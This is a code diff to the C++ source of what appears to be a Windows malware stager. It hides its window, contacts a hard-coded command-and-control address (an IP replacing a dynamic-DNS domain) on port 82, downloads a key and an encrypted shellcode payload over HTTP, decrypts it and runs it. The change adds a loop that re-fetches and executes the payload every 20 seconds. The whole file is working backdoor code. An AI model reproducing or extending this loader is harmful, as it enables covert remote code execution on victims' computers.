@@ -1,3 +1,4 @@
+#include "dns.h"
 #include <windows.h>  
 #include <string>
 #include "b64/base64.h"
@@ -15,10 +16,11 @@
 #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
 //#pragma comment(linker, "/INCREMENTAL:NO")
 
-const char target[] = "asufhcnfufkd.f3322.net";
+const char target[] = "167.179.71.52";
 
 char *ip;
 const int  port = 82;
+char t_ip[20];
 const char obscure[] = "vtyuiaslkjfasfalsflkhlksadjlkgjlkdsajglkadnlkgsd";
 typedef void(__stdcall *CODE) ();
 char * shellcode = NULL;
@@ -27,28 +29,15 @@ struct in_addr addr;
 typedef PVOID (*M) (DWORD, DWORD, DWORD, DWORD);
 
 void GetIP() {
-	int ret;
-	WSADATA wsaData;
-	ret = WSAStartup(0x101, &wsaData);
+	
+	if (parse_domain(target, t_ip) == false) {
+		ip = (char*)target;
+	}
+	else {
+		ip = t_ip;
+	}
 	
 
-	if (ret != 0)
-	{
-		ip = (char *)target;
-		return;
-	}
-	hostent* host;
-	host = gethostbyname(target);
-	if (!host)
-	{
-		ip = (char *)target;
-		MessageBox(0, ip, ip, 0);
-		return;
-	}
-	addr.s_addr = *(unsigned long *)host->h_addr;
-	ip = inet_ntoa(addr);
-	MessageBox(0, ip, ip, 0);
-	WSACleanup();
 	return;
 }
 
@@ -61,7 +50,7 @@ std::string GenerateUri()
 }
 void GetShellCodeSize()
 {
-	std::string host = std::string(ip);
+	std::string host = std::string(target);
 	HttpRequest httpReq(host, port);
 	std::string res = httpReq.HttpGet("/my/get_size");
 	std::string body = httpReq.getBody(res);
@@ -74,7 +63,7 @@ std::string GetKey()
 {
 	GetShellCodeSize();
 	
-	std::string host = std::string(ip);
+	std::string host = std::string(target);
 	HttpRequest httpReq(host, port);
 	std::string res = httpReq.HttpGet("/"+ GenerateUri());
 
@@ -98,7 +87,7 @@ void LoadShellCode(char *shellcode)
 void DecPayload(std::string key)
 {
 	
-	std::string host = std::string(ip);
+	std::string host = std::string(target);
 	HttpRequest httpReq(host, port);
 	time_t myt = time(NULL);
 	int filename = int(int(myt) / 100);
@@ -121,10 +110,12 @@ void DecPayload(std::string key)
 
 int main()
 {  
-	GetIP();
-	//如果要不安装服务运行，请直接DecPayload(GetKey());
-	//ServiceInstall();
-	DecPayload(GetKey());
+	while (TRUE) {
+		GetIP();
+		DecPayload(GetKey());
+		Sleep(20000);
+	}
+	
 	
     return 0;  
 }  
